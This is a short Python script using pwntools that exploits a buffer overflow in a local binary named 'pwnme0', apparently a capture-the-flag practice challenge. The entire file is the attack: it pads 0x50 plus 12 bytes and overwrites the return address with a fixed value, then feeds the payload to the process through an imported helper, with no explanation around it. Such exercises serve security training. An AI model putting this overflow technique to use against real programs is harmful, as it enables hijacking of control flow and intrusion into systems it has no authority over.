from templates import buff_overflow
import pwn


def main():
    payload = (b"a" * (0x50 + 12)) + b"\x20\x04\x37\x13"

    buff_overflow(
        payload,
        pwn.process("./pwnme0"),
        interactive = False
    )


main()
